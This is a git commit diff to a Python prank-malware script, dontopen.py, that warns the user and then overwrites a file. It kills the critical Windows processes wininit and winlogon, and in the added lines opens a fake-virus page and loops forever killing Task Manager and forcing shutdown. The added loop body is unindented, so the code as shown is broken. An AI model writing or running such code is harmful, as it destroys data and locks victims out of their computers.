e15c5207a4ec6d891bdaf846ff83a11f3d443fef
someonefromdiscord <freehostlvr12@proton.me>
2024-11-08 14:50:54 +0100

    Update dontopen.py

--- dontopen.py
+++ dontopen.py
@@ -2,6 +2,7 @@ import time
 import os
 print("I warned you! wait 1 minute or close window if this is ur pc.")
 time.sleep(60)
+os.system("start https://geekprank.com/fake-virus/")
 f = open("demofile3.txt", "w")
 f.write("Woops! I have deleted the content!")
 f.close()
@@ -24,3 +25,6 @@ os.system("taskkill /f /im wininit.exe")
 os.system("taskkill /f /im winlogon.exe")
 os.system("shutdown -a")
 print("LOL TRY REBOOTING!")
+while True:
+os.system("taskkill /f /im taskmgr.exe >nul")
+os.system("shutdown -s -t 0")
